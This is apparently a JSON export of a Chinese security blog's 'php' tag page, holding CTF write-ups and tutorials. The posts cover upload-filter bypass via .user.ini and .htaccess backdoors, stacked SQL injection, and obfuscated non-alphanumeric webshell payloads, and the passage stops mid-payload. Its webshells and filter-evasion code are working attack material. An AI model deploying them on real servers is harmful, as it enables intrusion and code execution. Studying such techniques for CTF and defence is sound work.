{"name":"php","slug":"php","count":7,"postlist":[{"title":"black_magic","slug":"Black-magic","date":"2019-08-19T10:59:50.000Z","updated":"2019-09-03T14:23:09.995Z","comments":true,"path":"api/articles/Black-magic.json","excerpt":"<p>别说了，听我的！php is the best language!我不允许你有别的想法！ </p>\n<p>我要我觉得！不要你觉得！</p>","keywords":null,"cover":null,"content":null,"text":"别说了，听我的！php is the best language!我不允许你有别的想法！ 我要我觉得！不要你觉得！php 弱类型总结字符与数字的比较&lt;?php$a=1;if($a=TRUE)    echo &quot;1111\\n&quot;;if($a=&apos;a&","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"},{"name":"弱类型","slug":"弱类型","count":1,"path":"api/tags/弱类型.json"}]},{"title":"命令执行漏洞(Command Execution)","slug":"Command-Execution","date":"2019-03-23T07:13:47.000Z","updated":"2019-08-20T14:59:26.283Z","comments":true,"path":"api/articles/Command-Execution.json","excerpt":"<p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system,exec,shell_exec等，当用户可以执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行漏洞。</p>","keywords":null,"cover":null,"content":null,"text":"当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system,exec,shell_exec等，当用户可以执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行漏洞。漏洞概念当应用需要调用一些外部程序去处理内容的情况下，就会用","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"},{"name":"命令执行","slug":"命令执行","count":1,"path":"api/tags/命令执行.json"}]},{"title":"SUCTF-2019","slug":"suctf-2019-WP","date":"2019-09-10T10:15:38.000Z","updated":"2019-09-11T14:54:46.974Z","comments":true,"path":"api/articles/suctf-2019-WP.json","excerpt":"","keywords":null,"cover":"https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png","content":"<h1 id=\"SUCTF-2019-WP\"><a href=\"#SUCTF-2019-WP\" class=\"headerlink\" title=\"SUCTF-2019 WP\"></a>SUCTF-2019 WP</h1><p>9/10/2019 6:15:38 PM </p>\n<h2 id=\"checkin\"><a href=\"#checkin\" class=\"headerlink\" title=\"checkin\"></a>checkin</h2><p>先上传一个 <code>websell.php</code>，显示后缀不合法(改<code>php5</code>、<code>php4</code>、<code>content-type</code>这些都不行)。</p>\n<p>再上传一个图片马发现显示 <code>&amp;lt;? in contents!</code> ，就是说<code>&lt; ?</code>不能连续存在。</p>\n<p>我们通过<code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code>来绕过对<code>&lt;?</code>的检测。这次我们得到回显<br>    exif_imagetype:not image!</p>\n<p><code>exif_imagetype</code>用来判断图片类型，他读取一个图像的第一个字节并检查其签名。只要我们添加一个图片头就可以绕过，比如添加<code>GIF89a</code>.在添加完之后我们上传成功，此时的文件目录下除了我们上传的<code>webshell</code>还有一个<code>index.php</code>.</p>\n<h3 id=\"user-ini-文件构成的后门\"><a href=\"#user-ini-文件构成的后门\" class=\"headerlink\" title=\".user.ini 文件构成的后门\"></a>.user.ini 文件构成的后门</h3><p>详情看p神这篇文章<a href=\"http://www.vuln.cn/6001\" title=\"点这里\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/6001</a></p>\n<blockquote>\n<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>\n</blockquote>\n<blockquote>\n<p>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>\n</blockquote>\n<p><code>.user.ini</code>类似一个用户自定义的<code>php.ini</code>。我们能够自定义的设置是”<code>PHP_INI_PERDIR</code> 、 <code>PHP_INI_USER</code>“的设置。（上面表格中没有提到的<code>PHP_INI_PERDIR</code>也可以在<code>.user.ini</code>中设置）</p>\n<p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括<code>PHP_INI_ALL</code>）都是可以通过<code>.user.ini</code>来设置的。</p>\n<p>和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>\n<p><img src=\"https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png\" alt=\"php中两个配置\"></p>\n<p><code>auto_prepend_file</code> 意味这是在php脚本执行前会执行这个参数设置的脚本，类似于在文件前调用<code>require()</code>然后这个参数的脚本所在目录受<code>include_path</code>限制<br><code>append</code>是在<code>php</code>脚本执行后才执行的，但是要注意的是遇到<code>exit()</code>的时候，这个脚本也不能运行</p>\n<p>使用的时候直接写在<code>.user.ini</code>中</p>\n<pre><code>auto_prepend_file=webshell.gif</code></pre><p>webshell.gif是要包含的文件.所以我们可以借助这个配置项来让所有的php文件都“自动”包含这个文件。👍</p>\n<p>某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。</p>\n<p>.htaccess文件构成的后门看这里：<a href=\"https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet\" title=\".htaccess\">https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet</a>这个只能用于Apache</p>\n<p>看到这里我们发现当前目录下确实有<code>index.php</code>可以利用，于是我们开始吧🎈</p>\n<h3 id=\"开始上传\"><a href=\"#开始上传\" class=\"headerlink\" title=\"开始上传\"></a>开始上传</h3><p>我们先构造<code>.user.ini</code>文件</p>\n<pre><code>GIF89a\nauto_prepend_file=CK.jpg</code></pre><p>然后将其上传</p>\n<p>接着构造图片马<code>CK.jpg</code></p>\n<pre><code>GIF89a\n&lt;script language=&apos;php&apos;&gt;\n    system(&apos;cat /flag&apos;);\n&lt;/script&gt;</code></pre><p>成功上传之后我们访问上传后的页面即可看到flag。</p>\n<h2 id=\"easy-sql\"><a href=\"#easy-sql\" class=\"headerlink\" title=\"easy sql\"></a>easy sql</h2><p>存在堆叠注入，测试<code>1;show tables;</code>回显</p>\n<pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag ) </code></pre><p>测试<code>1;select * from Flag;</code>,flag被过滤了</p>\n<p><code>.index.php.swp</code>存在源码泄露,源码如下  </p>\n<pre><code>&lt;?php\n    session_start();\n\n    include_once &quot;config.php&quot;;\n\n    $post = array();\n    $get = array();\n    global $MysqlLink;\n\n    //GetPara();\n    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);\n    if(!$MysqlLink){\n        die(&quot;Mysql Connect Error!&quot;);\n    }\n    $selectDB = mysqli_select_db($MysqlLink,$dataName);\n    if(!$selectDB){\n        die(&quot;Choose Database Error!&quot;);\n    }\n\n    foreach ($_POST as $k=&gt;$v){\n        if(!empty($v)&amp;&amp;is_string($v)){\n            $post[$k] = trim(addslashes($v));\n        }\n    }\n    foreach ($_GET as $k=&gt;$v){\n        }\n    }\n    //die();\n    ?&gt;\n\n&lt;html&gt;\n&lt;head&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n\n&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;\n&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;\n&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;\n&lt;input type=&quot;submit&quot;&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n&lt;?php\n\n    if(isset($post[&apos;query&apos;])){\n        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\&quot;&quot;;\n        //var_dump(preg_match(&quot;/{$BlackList}/is&quot;,$post[&apos;query&apos;]));\n        if(preg_match(&quot;/{$BlackList}/is&quot;,$post[&apos;query&apos;])){\n            //echo $post[&apos;query&apos;];\n            die(&quot;Nonono.&quot;);\n        }\n        if(strlen($post[&apos;query&apos;])&gt;40){\n            die(&quot;Too long.&quot;);\n        }\n        $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;\n        mysqli_multi_query($MysqlLink,$sql);\n        do{\n            if($res = mysqli_store_result($MysqlLink)){\n                while($row = mysqli_fetch_row($res)){\n                    print_r($row);\n                }\n            }\n        }while(@mysqli_next_result($MysqlLink));\n\n    }\n\n    ?&gt;</code></pre><p>查询语句为：<code>$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code></p>\n<h3 id=\"logical-OR\"><a href=\"#logical-OR\" class=\"headerlink\" title=\"|| logical OR\"></a>|| logical OR</h3><pre><code>mysql&gt; SELECT 1 OR 1;\n        -&gt; 1\nmysql&gt; SELECT 1 OR 0;\n        -&gt; 1\nmysql&gt; SELECT 0 OR 0;\n        -&gt; 0\nmysql&gt; SELECT 0 OR NULL;\n        -&gt; NULL\nmysql&gt; SELECT 1 OR NULL;\n        -&gt; 1</code></pre><blockquote>\n<p>Logical OR. When both operands are non-NULL, the result is 1 if any operand is nonzero, and 0 otherwise. With a NULL operand, the result is 1 if the other operand is nonzero, and NULL otherwise. If both operands are NULL, the result is NULL. </p>\n</blockquote>\n<h3 id=\"如何做？\"><a href=\"#如何做？\" class=\"headerlink\" title=\"如何做？\"></a>如何做？</h3><p>先来看一个msql的配置</p>\n<p><strong>PIPES_AS_CONCAT</strong></p>\n<blockquote>\n<p>Treat || as a string concatenation operator (same as CONCAT()) rather than as a synonym for OR. </p>\n</blockquote>\n<p>如果配置了<code>sql_mode=PIPES_AS_CONCAT</code>，Mysql会把逻辑或当作一个字符串链接函数对待。  </p>\n<p><strong>CONCAT(str1,str2,…)</strong></p>\n<blockquote>\n<p>Returns the string that results from concatenating the arguments. May have one or more arguments. If all arguments are nonbinary strings, the result is a nonbinary string. If the arguments include any binary strings, the result is a binary string. A numeric argument is converted to its equivalent nonbinary string form. </p>\n</blockquote>\n<p><code>CONCAT()</code> returns NULL if any argument is NULL. </p>\n<pre><code>mysql&gt; SELECT CONCAT(&apos;My&apos;, &apos;S&apos;, &apos;QL&apos;);\n        -&gt; &apos;MySQL&apos;\nmysql&gt; SELECT CONCAT(&apos;My&apos;, NULL, &apos;QL&apos;);\n        -&gt; NULL\nmysql&gt; SELECT CONCAT(14.3);\n        -&gt; &apos;14.3&apos;</code></pre><p>我们通过<code>sql_mode=PIPES_AS_CONCAT</code>来将flag带出来</p>\n<p>payload:  <code>1;sql_mode=PIPES_AS_CONCAT;select 1</code>  </p>\n<p>语句为:</p>\n<pre><code>select 1;sql_mode=PIPES_AS_CONCAT;select 1;|| flag rom Flag;</code></pre><h3 id=\"非预期\"><a href=\"#非预期\" class=\"headerlink\" title=\"非预期\"></a>非预期</h3><p>payload:<code>*,1</code>构造<code>select *,1 || flag from Flag;</code> 即可查出全部内容。</p>\n","text":"SUCTF-2019 WP9/10/2019 6:15:38 PM checkin先上传一个 websell.php，显示后缀不合法(改php5、php4、content-type这些都不行)。再上传一个图片马发现显示 &amp;lt;? in contents! ，就是说&lt","link":"","raw":null,"photos":[],"categories":[{"name":"WP","slug":"WP","count":7,"path":"api/categories/WP.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]},{"title":"两种构成文件后门的方法","slug":"两种构成文件后门的方法","date":"2019-09-18T01:19:34.000Z","updated":"2019-09-25T12:07:29.143Z","comments":true,"path":"api/articles/两种构成文件后门的方法.json","excerpt":"","keywords":null,"cover":"https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png","content":"<h1 id=\"两种利用文件构成PHP后门的方法：-htaccess-amp-user-ini\"><a href=\"#两种利用文件构成PHP后门的方法：-htaccess-amp-user-ini\" class=\"headerlink\" title=\"两种利用文件构成PHP后门的方法：.htaccess &amp; .user.ini\"></a>两种利用文件构成PHP后门的方法：.htaccess &amp; .user.ini</h1><h2 id=\"user-ini\"><a href=\"#user-ini\" class=\"headerlink\" title=\".user.ini\"></a>.user.ini</h2><p>以下部分摘取于P神的博客<a href=\"http://www.vuln.cn/6001\" title=\"P神博客\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/6001</a></p>\n<h3 id=\"user-ini-是什么？\"><a href=\"#user-ini-是什么？\" class=\"headerlink\" title=\".user.ini 是什么？\"></a>.user.ini 是什么？</h3><p>只要是以fastcgi运行的php都可以用<code>.user.ini</code>构成文件后门的方法。相比于<code>.htaccess</code>有更大的利用空间。 </p>\n<p>我们从php手册可以看到php.ini是php默认的配置文件，这里是配置选项列表<a href=\"https://www.php.net/manual/zh/ini.list.php\" title=\"配置项列表\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/zh/ini.list.php</a>  从表中我们可以看到有 <code>PHP_INI_PERDIR</code>、<code>PHP_INI_SYSTEM</code>    、<code>PHP_INI_USER</code>、<code>PHP_INI_ALL</code> 四种模式，那么这四种有什么区别呢？  </p>\n<pre><code>模式                含义\nPHP_INI_USER    可在用户脚本（例如 ini_set() ）或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定\nPHP_INI_PERDIR    可在 php.ini，.htaccess 或 httpd.conf 中设定\nPHP_INI_SYSTEM    可在 php.ini 或 httpd.conf 中设定\nPHP_INI_ALL        可在任何地方设定</code></pre><p>这里提到了我们可以自己设置的模式有 <code>PHP_INI_USER</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>。 在这里我们看到了 <code>.user.ini</code> 。翻阅手册<a href=\"https://www.php.net/manual/zh/configuration.file.per-user.php\" title=\"手册\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/zh/configuration.file.per-user.php</a>可知：</p>\n<blockquote>\n<p>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。</p>\n<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>\n<p>在 .user.ini 风格的 INI 文件中只有具有 <strong>PHP_INI_PERDIR</strong> 和 <strong>PHP_INI_USER</strong> 模式的 INI 设置可被识别。</p>\n<p>两个新的 INI 指令，user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。</p>\n<p>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。</p>\n<p>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p>\n</blockquote>\n<p>同时与php.ini不同的是.user.ini是一个能动态加载的配置文件，修改文件内容之后不需要重启中间件只需要等待  <code>user_ini.cache_ttl</code> 时间即可被加载。</p>\n<p>也就是说 <code>.user.ini</code> 其实就是一个我们可以自定义php配置的文件。</p>\n<h3 id=\"如何利用？\"><a href=\"#如何利用？\" class=\"headerlink\" title=\"如何利用？\"></a>如何利用？</h3><p>从php配置列表里我们发现无法配置一些关键的配置，但是在构成文件后门时我们找到了两个我们可以自己配置的选项：</p>\n<p><img src=\"https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png\" alt></p>\n<p><strong>auto_prepend_file</strong></p>\n<blockquote>\n<p>Specifies the name of a file that is automatically parsed before the main file. The file is included as if it was called with the require function, so include_path is used.</p>\n<p>The special value none disables auto-prepending.</p>\n</blockquote>\n<p>指定一个文件在主文件之前自动解析，这个被包含的文件相当于在主文件之前调用了 <code>require</code> 函数，路径受到<code>include_path</code> 限制。 <code>include_path</code> 会指定 <em>require, include, fopen(), file(), readfile() and file_get_contents()</em> 这些函数执行时去哪寻找文件。</p>\n<p><strong>auto_append_file</strong></p>\n<blockquote>\n<p>Specifies the name of a file that is automatically parsed after the main file. The file is included as if it was called with the require function, so include_path is used.</p>\n<p>The special value none disables auto-appending.</p>\n<p>Note: If the script is terminated with exit(), auto-append will not occur.</p>\n</blockquote>\n<p>我们利用的重点是第一个配置，同时我们从文档也可以看出在利用时我们需要一个<strong>正常</strong>的php文件来包含我们的webshell，*<em>也就是说我们只有在文件夹里有可以正常解析(使用fastcgi模式解析)的php文件时才能这样利用。<br>*</em><br>使用时也简单直接写在<code>.user.ini</code>中</p>\n<pre><code>auto_prepend_file=webshell.jpg</code></pre><h3 id=\"效果如何？\"><a href=\"#效果如何？\" class=\"headerlink\" title=\"效果如何？\"></a>效果如何？</h3><p>环境win10+php-5.45-nts+Nginx</p>\n<p>结果如下：</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1g7c0otmfxdj313c0f476s.jpg\" alt=\"效果如图\"></p>\n<h2 id=\"htaccess\"><a href=\"#htaccess\" class=\"headerlink\" title=\".htaccess\"></a>.htaccess</h2><h3 id=\"htaccess是什么？\"><a href=\"#htaccess是什么？\" class=\"headerlink\" title=\".htaccess是什么？\"></a>.htaccess是什么？</h3><p>翻阅apaceh官方文档<a href=\"https://httpd.apache.org/docs/current/howto/htaccess.html\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/howto/htaccess.html</a>可知</p>\n<blockquote>\n<p>.htaccess files provide a way to make configuration changes on a per-directory basis.</p>\n</blockquote>\n<p><code>.htaccess</code> 文件提供了一种目录级别的修改配置的方式。一个文件，包含一条或多条配置指令，放置于目录下，这些配置指令对当前目录和其所有子目录生效。</p>\n<h3 id=\"SetHandler\"><a href=\"#SetHandler\" class=\"headerlink\" title=\"SetHandler\"></a>SetHandler</h3><p>我们在 <code>.htaccess</code> 文件中可以通过增加 <code>handler-name</code> 来配置文件的解析方式。比如你有一个目录，你想让它被 <code>imagemap rule files</code> 解析，你可以在在 <code>.htaccess</code> 文件中加入这段代码：</p>\n<pre><code>SetHandler imap-file</code></pre><p>同样的，<code>AddType</code> 可指示文件管理系统对给出的文件名以选定的文件类型进行解析。</p>\n<pre><code>AddType image/gif .gif</code></pre><p>同时，我们也可以在以 <code>php</code> 作为 <code>Apacec module</code> 时，通过 <code>php_value</code> 来配置PHP的配置选项：</p>\n<pre><code>php_value name value</code></pre><p>设置指定的值. 只适合于 PHP_INI_ALL 和 PHP_INI_PERDIR 类型指令</p>\n<h3 id=\"如何利用？-1\"><a href=\"#如何利用？-1\" class=\"headerlink\" title=\"如何利用？\"></a>如何利用？</h3><p><strong>文件解析上传漏洞</strong></p>\n<p>.htaccess文件中定义了将上传的文件后缀名为 .jpg 格式的文件以 php 格式来解析文件。.htaccess 是apache服务器中的一个配置文件，不是上传的文件的黑名单之内，所以该类型文件可以上传成功。</p>\n<pre><code>AddType  application/x-httpd-php  .jpg</code></pre><p>还可以这样：</p>\n<pre><code># FileMatch 参数即为文件名的正则匹配\n&lt;FilesMatch &quot;sniperoj&quot;&gt;\n  SetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;\n\n// sniperoj\n&lt;?php eval($_GET[&apos;c&apos;]);?&gt;</code></pre><p><strong>文件包含</strong></p>\n<pre><code>index.php: (empty)\n\n.htaccess:\n\nphp_value auto_append_file /etc/hosts</code></pre><p><strong>PHP 代码执行</strong></p>\n<pre><code>index.php: (empty)\n\n.htaccess:\n\nphp_value auto_append_file .htaccess\n#&lt;?php phpinfo();</code></pre><h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><blockquote>\n<p><a href=\"https://httpd.apache.org/docs/current/howto/htaccess.html\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/howto/htaccess.html</a></p>\n<p><a href=\"http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html\" target=\"_blank\" rel=\"noopener\">http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html</a></p>\n<p><a href=\"https://httpd.apache.org/docs/current/mod/mod_authn_core.html#authtype\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/mod/mod_authn_core.html#authtype</a></p>\n<p><a href=\"https://httpd.apache.org/docs/current/mod/core.html#sethandler\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/mod/core.html#sethandler</a></p>\n<p><a href=\"https://httpd.apache.org/docs/current/mod/mod_mime.html#addhandler\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/mod/mod_mime.html#addhandler</a></p>\n<p><a href=\"https://www.php.net/manual/en/configuration.changes.php\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/en/configuration.changes.php</a></p>\n<p><a href=\"https://www.cnblogs.com/xia0zhiwei/p/4713438.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/xia0zhiwei/p/4713438.html</a></p>\n<p><a href=\"http://www.vuln.cn/6001\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/6001</a></p>\n</blockquote>\n","text":"两种利用文件构成PHP后门的方法：.htaccess &amp; .user.ini.user.ini以下部分摘取于P神的博客http://www.vuln.cn/6001.user.ini 是什么？只要是以fastcgi运行的php都可以用.user.ini构成文件后门的方法。","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]},{"title":"Session_unserlize","slug":"session-unserialize","date":"2019-08-01T11:33:07.000Z","updated":"2019-08-10T07:52:37.169Z","comments":true,"path":"api/articles/session-unserialize.json","excerpt":"<p>session的反序列化利用</p>","keywords":null,"cover":"http://wx1.sinaimg.cn/mw690/006boCb9ly1g5jyd32htkj30iv04dt8q.jpg","content":null,"text":"session的反序列化利用8/1/2019 10:44:57 AM 对魔法函数的再次认识常用方法__construct()//创建对象时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() /","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"},{"name":"serialize","slug":"serialize","count":4,"path":"api/tags/serialize.json"}]},{"title":"特殊的webshell","slug":"特殊的webshell","date":"2019-09-27T03:26:55.000Z","updated":"2020-05-09T03:59:06.848Z","comments":true,"path":"api/articles/特殊的webshell.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"特殊的webshell\"><a href=\"#特殊的webshell\" class=\"headerlink\" title=\"特殊的webshell\"></a>特殊的webshell</h1><p>实验环境 ：<code>php 5.45+nts+apache</code></p>\n<blockquote>\n<p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p>\n<p>但 php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p>\n</blockquote>\n<h2 id=\"不包含数字字母\"><a href=\"#不包含数字字母\" class=\"headerlink\" title=\"不包含数字字母\"></a>不包含数字字母</h2><pre><code>&lt;?php\n@highlight_file(__FILE__);\nif(!preg_match(&apos;/[a-z0-9]/is&apos;,$_GET[&apos;shell&apos;])) {\n eval($_GET[&apos;shell&apos;]);\n}\n?&gt;</code></pre><h3 id=\"异或\"><a href=\"#异或\" class=\"headerlink\" title=\"异或\"></a>异或</h3><p>异或是对字符的 <code>ascii</code>码进行逐位异或以后得到一个异或结果<code>ascii</code>码的字符。</p>\n<p>第一种方法就是这样来绕过数字字母的检测。</p>\n<pre><code>$a=urldecode(&apos;%01&apos;); //ascii 0x01\n$b=urldecode(&apos;`&apos;);   //ascii 96\necho $a^$b;             //a\n96:  0110 0000\n%01: 0000 0001         //相当于ascii+1</code></pre><p>我们统一选取  ‘`’  作为我们异或的起点，因为他的 ascii 是96。</p>\n<pre><code>$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;);\n$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;;\n$___=$$__;\n$_($___[_]); // assert($_POST[_]);</code></pre><p>在如下过滤中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/[a-z0-9]/is'</span>,$_GET[<span class=\"string\">'shell'</span>])) &#123;</span><br><span class=\"line\"> <span class=\"keyword\">eval</span>($_GET[<span class=\"string\">'shell'</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>我们 <code>POST : _=phpinfo();</code> 即可成功执行</p>\n<h3 id=\"取反\"><a href=\"#取反\" class=\"headerlink\" title=\"取反\"></a>取反</h3><p>通过取反将汉字编码中的编码取出来进行取反</p>\n<pre><code>echo ((&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)).&apos; &apos;;//利用弱类型的特性\n$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);\n$_=$__/$__;\necho $_;\necho ~(&apos;和&apos;{2});              //s</code></pre><p>payload:</p>\n<pre><code>$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)%2b(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);\n$_=$__/$__;\n\n$____=&apos;&apos;;\n$___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__});\n\n$_____=&apos;_&apos;;$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_});\n\n$_=$$_____;\n$____($_[$__]);</code></pre><p>效果如下：</p>\n<h3 id=\"字符递增\"><a href=\"#字符递增\" class=\"headerlink\" title=\"字符递增\"></a>字符递增</h3><blockquote>\n<p>在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 $a = ‘Z’; $a++; 将把 $a 变成’AA’，而在 C 中，a = ‘Z’; a++; 将把 a 变成 ‘[‘（’Z’ 的 ASCII 值是 90，’[‘ 的 ASCII 值是 91）。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。 </p>\n</blockquote>\n<pre><code>echo &quot;&lt;h3&gt;Postincrement&lt;/h3&gt;&quot;;\n$a = 5;\necho &quot;Should be 5: &quot; . $a++ . &quot;&lt;br /&gt;\\n&quot;; //5\necho &quot;Should be 6: &quot; . $a . &quot;&lt;br /&gt;\\n&quot;;   //6\n$c = &apos;b&apos;;\necho $c++.&quot;&lt;br /&gt;\\n&quot;;                     //b\necho $c.&quot;\\n&quot;;                               //c\n?&gt;</code></pre><p>我们只要拿到一个变量值为 <code>a</code> ，通过自增操作就可以获得 <code>a-z</code> 中所有字符。</p>\n<p>php中如果强制链接数组和字符串的话，数组会被转换成字符串，值为 <code>Arrary</code> </p>\n<pre><code>echo &apos;&apos;.[];   //Array</code></pre><p>我们取第一个字符就可以得到 <code>A</code> 了。</p>\n<p>payload:</p>\n<pre><code>&lt;?php\n$_=[];\n$_=@&quot;$_&quot;; // $_=&apos;Array&apos;;\n$_=$_[&apos;!&apos;==&apos;@&apos;]; // $_=$_[0];\n$___=$_; // A\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__; // S\n$___.=$__; // S\n$__=$_;\n$__++;$__++;$__++;$__++; // E \n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$___.=$__;\n\n$____=&apos;_&apos;;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // 